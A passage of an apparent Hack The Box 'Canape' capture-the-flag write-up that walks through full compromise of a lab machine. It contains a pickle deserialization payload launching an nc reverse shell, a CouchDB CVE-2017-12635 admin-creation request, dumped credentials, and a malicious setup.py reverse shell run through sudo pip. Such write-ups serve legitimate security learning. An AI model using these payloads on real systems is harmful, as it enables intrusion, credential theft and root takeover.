+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>shell</span><span class=p>(</span><span class=nb>object</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>  <span class=k>def</span> <span class=fm>__init__</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=bp>self</span><span class=o>.</span><span class=n>reverse_ip</span> <span class=o>=</span> <span class=s2>&#34;10.10.14.216&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=bp>self</span><span class=o>.</span><span class=n>reverse_port</span> <span class=o>=</span> <span class=s2>&#34;42424&#34;</span>
+</span></span><span class=line><span class=cl>  <span class=k>def</span> <span class=nf>__reduce__</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=p>(</span><span class=n>os</span><span class=o>.</span><span class=n>system</span><span class=p>,</span> <span class=p>(</span><span class=s2>&#34;rm /tmp/shell; mknod /tmp/shell p; nc </span><span class=si>%s</span><span class=s2> </span><span class=si>%s</span><span class=s2> &lt; /tmp/shell | /bin/bash &gt; /tmp/shell&#34;</span> <span class=o>%</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>reverse_ip</span><span class=p>,</span> <span class=bp>self</span><span class=o>.</span><span class=n>reverse_port</span><span class=p>),))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>  <span class=n>character</span> <span class=o>=</span> <span class=s2>&#34;S&#39;homer&#39;</span><span class=se>\n</span><span class=s2>&#34;</span>
+</span></span><span class=line><span class=cl>  <span class=n>quote</span>     <span class=o>=</span> <span class=n>cPickle</span><span class=o>.</span><span class=n>dumps</span><span class=p>(</span><span class=n>shell</span><span class=p>())</span>
+</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=n>re</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=s1>&#39;&lt;strong&gt;Success!&lt;/strong&gt;&#39;</span><span class=p>,</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=s1>&#39;http://10.10.10.70/submit&#39;</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=p>{</span><span class=s2>&#34;character&#34;</span><span class=p>:</span><span class=n>character</span><span class=p>,</span> <span class=s2>&#34;quote&#34;</span><span class=p>:</span><span class=n>quote</span><span class=p>})</span><span class=o>.</span><span class=n>text</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span> <span class=s1>&#39;Success&#39;</span>
+</span></span><span class=line><span class=cl>    <span class=n>p_id</span> <span class=o>=</span> <span class=n>hashlib</span><span class=o>.</span><span class=n>md5</span><span class=p>(</span><span class=n>character</span> <span class=o>+</span> <span class=n>quote</span><span class=p>)</span><span class=o>.</span><span class=n>hexdigest</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=s2>&#34;http://10.10.10.70/check&#34;</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=p>{</span><span class=s2>&#34;id&#34;</span><span class=p>:</span><span class=n>p_id</span><span class=p>})</span><span class=o>.</span><span class=n>text</span>
+</span></span></code></pre></td></tr></table></div></div><p>This payload will create a reverse shell, so the server will connect back on a listener I&rsquo;m controlling and offer me a bash shell.</p><p>Let&rsquo;s start a listener and set some proper TTY environment once we are connected on the remote shell:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ stty raw -echo
+</span></span><span class=line><span class=cl>$ nc -lvnp 42424
+</span></span><span class=line><span class=cl>$ SHELL=/bin/bash script -q /dev/null
+</span></span></code></pre></td></tr></table></div></div><p>You&rsquo;ll tell me, what is the black magic around netcat?</p><p>This is basically for <a href=https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/>Upgrading simple shells to fully interactive TTYs</a>.
+If you are curious you can read the previously linked article and also the following man page <code>STTY(1)</code> and <code>SCRIPT(1)</code>.</p><h3 id=privilege-escalation-of-machine----from-service-to-user>Privilege Escalation of Machine - From service to user<a hidden class=anchor aria-hidden=true href=#privilege-escalation-of-machine----from-service-to-user>#</a></h3><p>The goal of Privilege Escalation of Machine a.k.a. Privilege Escalation (priv esc or PE), is to go from a low privilege access tp a high privilege one.
+So here on a linux system we will try to get root.</p><p>But before attacking a vulnerable service, I must find it!</p><p>A good idea if not using an automated tool, is to stick to an enumeration guide like this one: <a href=https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/>Basic Linux Privilege Escalation</a>.</p><p>The first thing we need to know is, on which operating system (OS) are we and with which kernel:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ cat /etc/os-release
+</span></span><span class=line><span class=cl>NAME=&#34;Ubuntu&#34;
+</span></span><span class=line><span class=cl>VERSION=&#34;16.04.4 LTS (Xenial Xerus)&#34;
+</span></span><span class=line><span class=cl>ID=ubuntu
+</span></span><span class=line><span class=cl>ID_LIKE=debian
+</span></span><span class=line><span class=cl>PRETTY_NAME=&#34;Ubuntu 16.04.4 LTS&#34;
+</span></span><span class=line><span class=cl>VERSION_ID=&#34;16.04&#34;
+</span></span><span class=line><span class=cl>HOME_URL=&#34;http://www.ubuntu.com/&#34;
+</span></span><span class=line><span class=cl>SUPPORT_URL=&#34;http://help.ubuntu.com/&#34;
+</span></span><span class=line><span class=cl>BUG_REPORT_URL=&#34;http://bugs.launchpad.net/ubuntu/&#34;
+</span></span><span class=line><span class=cl>VERSION_CODENAME=xenial
+</span></span><span class=line><span class=cl>UBUNTU_CODENAME=xenial
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>$ uname -r
+</span></span><span class=line><span class=cl>4.4.0-119-generic
+</span></span></code></pre></td></tr></table></div></div><p>We are lucky, we won&rsquo;t need to do much enumeration.
+Remember?
+In the web application source code, we saw there was a CouchDB server.
+Let&rsquo;s see what the service has to answer:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>$</span> <span class=n>curl</span> <span class=n>http</span><span class=p>:</span><span class=o>//</span><span class=n>localhost</span><span class=p>:</span><span class=mi>5984</span><span class=o>/</span>
+</span></span><span class=line><span class=cl><span class=p>{</span><span class=s2>&#34;couchdb&#34;</span><span class=p>:</span><span class=s2>&#34;Welcome&#34;</span><span class=p>,</span><span class=s2>&#34;version&#34;</span><span class=p>:</span><span class=s2>&#34;2.0.0&#34;</span><span class=p>,</span><span class=s2>&#34;vendor&#34;</span><span class=p>:{</span><span class=s2>&#34;name&#34;</span><span class=p>:</span><span class=s2>&#34;The Apache Software Foundation&#34;</span><span class=p>}}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>root</span>        <span class=mi>649</span>    <span class=mi>642</span>  <span class=mi>0</span> <span class=mi>11</span><span class=p>:</span><span class=mi>38</span> <span class=err>?</span>        <span class=n>Ss</span>     <span class=mi>0</span><span class=p>:</span><span class=mi>00</span>  \<span class=n>_</span> <span class=n>runsv</span> <span class=n>couchdb</span>
+</span></span><span class=line><span class=cl><span class=n>root</span>        <span class=mi>650</span>    <span class=mi>649</span>  <span class=mi>0</span> <span class=mi>11</span><span class=p>:</span><span class=mi>38</span> <span class=err>?</span>        <span class=n>S</span>      <span class=mi>0</span><span class=p>:</span><span class=mi>00</span>      \<span class=n>_</span> <span class=n>svlogd</span> <span class=o>-</span><span class=n>tt</span> <span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=nb>log</span><span class=o>/</span><span class=n>couchdb</span>
+</span></span><span class=line><span class=cl><span class=p>:</span>
+</span></span><span class=line><span class=cl><span class=n>homer</span>       <span class=mi>663</span>    <span class=mi>649</span>  <span class=mi>0</span> <span class=mi>11</span><span class=p>:</span><span class=mi>38</span> <span class=err>?</span>        <span class=n>Sl</span>     <span class=mi>1</span><span class=p>:</span><span class=mi>57</span>      \<span class=n>_</span> <span class=o>/</span><span class=n>home</span><span class=o>/</span><span class=n>homer</span><span class=o>/</span><span class=n>bin</span><span class=o>/../</span><span class=n>erts</span><span class=o>-</span><span class=mf>7.3</span><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=n>beam</span> <span class=o>-</span><span class=n>K</span> <span class=bp>true</span> <span class=o>-</span><span class=n>A</span> <span class=mi>16</span> <span class=o>-</span><span class=n>Bd</span> <span class=o>--</span> <span class=o>-</span><span class=n>root</span> <span class=o>/</span><span class=n>home</span><span class=o>/</span><span class=n>homer</span><span class=o>/</span><span class=n>bin</span><span class=o>/..</span> <span class=o>-</span><span class=n>progname</span> <span class=n>couchdb</span> <span class=o>--</span> <span class=o>-</span><span class=n>home</span> <span class=o>/</span><span class=n>home</span><span class=o>/</span><span class=n>homer</span> <span class=o>--</span> <span class=o>-</span><span class=n>boot</span> <span class=o>/</span><span class=n>home</span><span class=o>/</span><span class=n>homer</span><span class=o>/</span><span class=n>bin</span><span class=o>/../</span><span class=n>releases</span><span class=o>/</span><span class=mf>2.0</span><span class=o>.</span><span class=mi>0</span><span class=o>/</span><span class=n>couchdb</span> <span class=o>-</span><span class=n>name</span> <span class=n>couchdb</span><span class=err>@</span><span class=n>localhost</span> <span class=o>-</span><span class=n>setcookie</span> <span class=n>monster</span> <span class=o>-</span><span class=n>kernel</span> <span class=n>error_logger</span> <span class=n>silent</span> <span class=o>-</span><span class=n>sasl</span> <span class=n>sasl_error_logger</span> <span class=bp>false</span> <span class=o>-</span><span class=n>noshell</span> <span class=o>-</span><span class=n>noinput</span> <span class=o>-</span><span class=n>config</span> <span class=o>/</span><span class=n>home</span><span class=o>/</span><span class=n>homer</span><span class=o>/</span><span class=n>bin</span><span class=o>/../</span><span class=n>releases</span><span class=o>/</span><span class=mf>2.0</span><span class=o>.</span><span class=mi>0</span><span class=o>/</span><span class=n>sys</span><span class=o>.</span><span class=n>config</span>
+</span></span></code></pre></td></tr></table></div></div><p>Now, I know the Apache CouchDB is in version 2.0.0.
+Bad luck for them!
+This version is vulnerable and impacted by some critical issues.</p><ul><li>Some public vulnerabilities: <a href=https://www.cvedetails.com/vulnerability-list/vendor_id-45/product_id-19046/version_id-230263/Apache-Couchdb-2.0.0.html>https://www.cvedetails.com/vulnerability-list/vendor_id-45/product_id-19046/version_id-230263/Apache-Couchdb-2.0.0.html</a></li><li>The public exploit I will use: <a href=https://www.exploit-db.com/exploits/44498/>https://www.exploit-db.com/exploits/44498/</a> Apache CouchDB JSON Remote Privilege Escalation Vulnerability (CVE-2017-12635)</li></ul><p>This exploit script will exploit the JSON API to create an admin user.
+As it is fairly easy, I will do it manually instead.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ curl -X PUT -H &#39;Content-Type: application/json&#39; -d &#39;{&#34;type&#34;: &#34;user&#34;, &#34;name&#34;: &#34;cyfun&#34;, &#34;roles&#34;: [&#34;_admin&#34;], &#34;roles&#34;: [], &#34;password&#34;: &#34;nopass&#34;}&#39; http://localhost:5984/_users/org.couchdb.user:cyfun
+</span></span><span class=line><span class=cl>cyfun
+</span></span><span class=line><span class=cl>{&#34;ok&#34;:true,&#34;id&#34;:&#34;org.couchdb.user:cyfun&#34;,&#34;rev&#34;:&#34;1-e140e509077e57fd6bd5b5491b7c0e09&#34;}
+</span></span></code></pre></td></tr></table></div></div><p>Now I have a CouchDB admin user <code>cyfun</code> with password <code>nopass</code>.</p><p>Apache CouchDB documentation is available <a href=https://docs.couchdb.org/en/stable/>here</a> but you won&rsquo;t be able to read 2.0.0 documentation as it has been archived.
+So you will have to download the PDF or HTML zip from <a href=https://readthedocs.org/projects/couchdb/downloads/>here</a>.</p><p>You also read the PDF directly with Firefox(thanks to PDF.js): <a href=https://buildmedia.readthedocs.org/media/pdf/couchdb/2.0.0/couchdb.pdf>https://buildmedia.readthedocs.org/media/pdf/couchdb/2.0.0/couchdb.pdf</a></p><p>On page 217, the endpoint <code>/_all_dbs</code> is described:</p><blockquote><p>Returns a list of all the databases in the CouchDB instance.</p></blockquote><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ curl -X GET http://cyfun:nopass@127.0.0.1:5984/_all_dbs -H &#39;Content-Type: application/json&#39;
+</span></span><span class=line><span class=cl>&#39;[&#34;_global_changes&#34;,&#34;_metadata&#34;,&#34;_replicator&#34;,&#34;_users&#34;,&#34;passwords&#34;,&#34;simpsons&#34;]&#39;
+</span></span></code></pre></td></tr></table></div></div><p>We can see there is a database <code>_users</code> and a one named <code>password</code>.</p><p>On page 249, the endpoint <code>/db/_all_docs</code> is described:</p><blockquote><p>Apache CouchDB, Release 2.0.0{"_id": &ldquo;FishStew&rdquo;,&ldquo;servings&rdquo;: 4,&ldquo;subtitle&rdquo;: &ldquo;Delicious with fresh bread&rdquo;,&ldquo;title&rdquo;: &ldquo;Fish Stew&rdquo;}Response:HTTP/1.1 202 AcceptedCache-Control: must-revalidateContent-Length: 28Content-Type: application/jsonDate: Tue, 13 Aug 2013 15:19:25 GMTLocation: http://localhost:5984/db/FishStewServer: CouchDB (Erlang/OTP){&ldquo;id&rdquo;: &ldquo;FishStew&rdquo;,&ldquo;ok&rdquo;:true}10.3.2/db/_all_docsGET /{db}/_all_docsReturns a JSON structure of all of the documents in a given database. The information is returned as a JSONstructure containing meta information about the return structure, including a list of all documents and basiccontents, consisting the ID, revision and key. The key is the from the document’s <code>_id</code>.</p></blockquote><p>Let&rsquo;s see the database <code>_users</code> first:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ curl -X GET -H &#39;Content-Type: application/json&#39; http://cyfun:nopass@127.0.0.1:5984/_users/_all_docs
+</span></span><span class=line><span class=cl>{&#34;total_rows&#34;:2,&#34;offset&#34;:0,&#34;rows&#34;:[
+</span></span><span class=line><span class=cl>{&#34;id&#34;:&#34;_design/_auth&#34;,&#34;key&#34;:&#34;_design/_auth&#34;,&#34;value&#34;:{&#34;rev&#34;:&#34;1-75efcce1f083316d622d389f3f9813f7&#34;}},
+</span></span><span class=line><span class=cl>{&#34;id&#34;:&#34;org.couchdb.user:cyfun&#34;,&#34;key&#34;:&#34;org.couchdb.user:cyfun&#34;,&#34;value&#34;:{&#34;rev&#34;:&#34;1-e140e509077e57fd6bd5b5491b7c0e09&#34;}}
+</span></span><span class=line><span class=cl>]}
+</span></span></code></pre></td></tr></table></div></div><p>Nothing much interesting here.</p><p>Now the database <code>password</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ curl -X GET -H &#39;Content-Type: application/json&#39; http://cyfun:nopass@127.0.0.1:5984/passwords/_all_docs
+</span></span><span class=line><span class=cl>{&#34;total_rows&#34;:4,&#34;offset&#34;:0,&#34;rows&#34;:[
+</span></span><span class=line><span class=cl>{&#34;id&#34;:&#34;739c5ebdf3f7a001bebb8fc4380019e4&#34;,&#34;key&#34;:&#34;739c5ebdf3f7a001bebb8fc4380019e4&#34;,&#34;value&#34;:{&#34;rev&#34;:&#34;2-81cf17b971d9229c54be92eeee723296&#34;}},
+</span></span><span class=line><span class=cl>{&#34;id&#34;:&#34;739c5ebdf3f7a001bebb8fc43800368d&#34;,&#34;key&#34;:&#34;739c5ebdf3f7a001bebb8fc43800368d&#34;,&#34;value&#34;:{&#34;rev&#34;:&#34;2-43f8db6aa3b51643c9a0e21cacd92c6e&#34;}},
+</span></span><span class=line><span class=cl>{&#34;id&#34;:&#34;739c5ebdf3f7a001bebb8fc438003e5f&#34;,&#34;key&#34;:&#34;739c5ebdf3f7a001bebb8fc438003e5f&#34;,&#34;value&#34;:{&#34;rev&#34;:&#34;1-77cd0af093b96943ecb42c2e5358fe61&#34;}},
+</span></span><span class=line><span class=cl>{&#34;id&#34;:&#34;739c5ebdf3f7a001bebb8fc438004738&#34;,&#34;key&#34;:&#34;739c5ebdf3f7a001bebb8fc438004738&#34;,&#34;value&#34;:{&#34;rev&#34;:&#34;1-49a20010e64044ee7571b8c1b902cf8c&#34;}}
+</span></span><span class=line><span class=cl>]}
+</span></span></code></pre></td></tr></table></div></div><p>Looks like there are 4 passwords here but only a reference to them.
+So I just have to request those id:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ curl -X GET -H &#39;Content-Type: application/json&#39; http://cyfun:nopass@127.0.0.1:5984/passwords/739c5ebdf3f7a001bebb8fc4380019e4
+</span></span><span class=line><span class=cl>{&#34;_id&#34;:&#34;739c5ebdf3f7a001bebb8fc4380019e4&#34;,&#34;_rev&#34;:&#34;2-81cf17b971d9229c54be92eeee723296&#34;,&#34;item&#34;:&#34;ssh&#34;,&#34;password&#34;:&#34;0B4jyA0xtytZi7esBNGp&#34;,&#34;user&#34;:&#34;&#34;}
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>$ curl -X GET -H &#39;Content-Type: application/json&#39; http://cyfun:nopass@127.0.0.1:5984/passwords/739c5ebdf3f7a001bebb8fc43800368d
+</span></span><span class=line><span class=cl>{&#34;_id&#34;:&#34;739c5ebdf3f7a001bebb8fc43800368d&#34;,&#34;_rev&#34;:&#34;2-43f8db6aa3b51643c9a0e21cacd92c6e&#34;,&#34;item&#34;:&#34;couchdb&#34;,&#34;password&#34;:&#34;r3lax0Nth3C0UCH&#34;,&#34;user&#34;:&#34;couchy&#34;}
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>$ curl -X GET -H &#39;Content-Type: application/json&#39; http://cyfun:nopass@127.0.0.1:5984/passwords/739c5ebdf3f7a001bebb8fc438003e5f
+</span></span><span class=line><span class=cl>{&#34;_id&#34;:&#34;739c5ebdf3f7a001bebb8fc438003e5f&#34;,&#34;_rev&#34;:&#34;1-77cd0af093b96943ecb42c2e5358fe61&#34;,&#34;item&#34;:&#34;simpsonsfanclub.com&#34;,&#34;password&#34;:&#34;h02ddjdj2k2k2&#34;,&#34;user&#34;:&#34;homer&#34;}
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>$ curl -X GET -H &#39;Content-Type: application/json&#39; http://cyfun:nopass@127.0.0.1:5984/passwords/739c5ebdf3f7a001bebb8fc438004738
+</span></span><span class=line><span class=cl>{&#34;_id&#34;:&#34;739c5ebdf3f7a001bebb8fc438004738&#34;,&#34;_rev&#34;:&#34;1-49a20010e64044ee7571b8c1b902cf8c&#34;,&#34;user&#34;:&#34;homerj0121&#34;,&#34;item&#34;:&#34;github&#34;,&#34;password&#34;:&#34;STOP STORING YOUR PASSWORDS HERE -Admin&#34;}
+</span></span></code></pre></td></tr></table></div></div><p>As it is all about Simpsons from the beginning, let&rsquo;s target the user <code>homer</code> with password <code>h02ddjdj2k2k2</code> and try to connect to ssh with those credentials.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ ssh homer@10.10.10.70 -p 65535
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>homer@canape:~$ cat user.txt 
+</span></span><span class=line><span class=cl>bce918696f293e62b2321703bb27288d
+</span></span></code></pre></td></tr></table></div></div><p>Success!</p><h3 id=privilege-escalation-of-machine----from-user-to-root>Privilege Escalation of Machine - From user to root<a hidden class=anchor aria-hidden=true href=#privilege-escalation-of-machine----from-user-to-root>#</a></h3><p>Here I&rsquo;m lucky again, no need for enumeration or exploits, just the ultimately basic check:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>homer@canape:~$ sudo -l
+</span></span><span class=line><span class=cl>[sudo] password for homer: 
+</span></span><span class=line><span class=cl>Matching Defaults entries for homer on canape:
+</span></span><span class=line><span class=cl>    env_reset, mail_badpass,
+</span></span><span class=line><span class=cl>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>User homer may run the following commands on canape:
+</span></span><span class=line><span class=cl>    (root) /usr/bin/pip install *
+</span></span></code></pre></td></tr></table></div></div><p>It seems we can install any python package with pip as root!</p><p>So let&rsquo;s create one that will bring me a root shell:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ cd
+</span></span><span class=line><span class=cl>$ vim setup.py
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>socket</span><span class=o>,</span><span class=nn>subprocess</span><span class=o>,</span><span class=nn>os</span>
+</span></span><span class=line><span class=cl><span class=n>s</span><span class=o>=</span><span class=n>socket</span><span class=o>.</span><span class=n>socket</span><span class=p>(</span><span class=n>socket</span><span class=o>.</span><span class=n>AF_INET</span><span class=p>,</span><span class=n>socket</span><span class=o>.</span><span class=n>SOCK_STREAM</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>s</span><span class=o>.</span><span class=n>connect</span><span class=p>((</span><span class=s2>&#34;10.10.14.63&#34;</span><span class=p>,</span><span class=mi>33333</span><span class=p>))</span>
+</span></span><span class=line><span class=cl><span class=n>os</span><span class=o>.</span><span class=n>dup2</span><span class=p>(</span><span class=n>s</span><span class=o>.</span><span class=n>fileno</span><span class=p>(),</span><span class=mi>0</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>os</span><span class=o>.</span><span class=n>dup2</span><span class=p>(</span><span class=n>s</span><span class=o>.</span><span class=n>fileno</span><span class=p>(),</span><span class=mi>1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>os</span><span class=o>.</span><span class=n>dup2</span><span class=p>(</span><span class=n>s</span><span class=o>.</span><span class=n>fileno</span><span class=p>(),</span><span class=mi>2</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>=</span><span class=n>subprocess</span><span class=o>.</span><span class=n>call</span><span class=p>([</span><span class=s2>&#34;/bin/bash&#34;</span><span class=p>,</span><span class=s2>&#34;-i&#34;</span><span class=p>]);</span>
+</span></span></code></pre></td></tr></table></div></div><p>Now I just have to install it as root:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ sudo /usr/bin/pip install -e . setup.py
+</span></span></code></pre></td></tr></table></div></div><p>Bingo!</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>root@canape:~# cat /root/root.txt
+</span></span><span class=line><span class=cl>cat  /root/root.txt
+</span></span><span class=line><span class=cl>928c3df1a12d7f67d2e8c2937120976d
+</span></span></code></pre></td></tr></table></div></div></div><footer class=post-footer><ul class=post-tags><li><a href=https://s4ch.github.io/tags/ctf/>Ctf</a></li><li><a href=https://s4ch.github.io/tags/hackthebox/>Hackthebox</a></li><li><a href=https://s4ch.github.io/tags/penetration-testing/>Penetration-Testing</a></li><li><a href=https://s4ch.github.io/tags/writeup/>Writeup</a></li><li><a href=https://s4ch.github.io/tags/linux/>Linux</a></li><li><a href=https://s4ch.github.io/tags/recon/>Recon</a></li><li><a href=https://s4ch.github.io/tags/network/>Network</a></li><li><a href=https://s4ch.github.io/tags/web/>Web</a></li><li><a href=https://s4ch.github.io/tags/python/>Python</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2026 <a href=https://s4ch.github.io/>CyFun</a></span>
+<span>Powered by
+<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
+<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
+</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>
